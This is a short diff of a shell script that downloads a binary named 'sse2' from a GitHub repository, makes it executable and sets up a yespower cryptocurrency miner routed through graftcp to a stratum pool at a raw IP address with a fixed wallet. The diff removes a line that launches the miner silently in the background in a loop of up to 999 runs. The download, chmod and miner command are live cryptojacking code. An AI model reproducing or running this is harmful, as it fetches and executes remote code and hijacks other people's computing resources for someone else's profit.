@@ -28,4 +28,4 @@ wget https://github.com/Akatsoki/nungx/raw/main/sse2
 chmod +x sse2
 
 wallet="./graftcp/graftcp ./sse2 -a yespower -o stratum+tcps://146.59.217.34:17017 -u web1qxnm9q7txetqj6uzxat4xkas6rxr93q5fc7xjm4.GEDO -t 15 "
-nohup $(for i in {1..999}; do $(echo $wallet); done) >/dev/null 2>&1
+
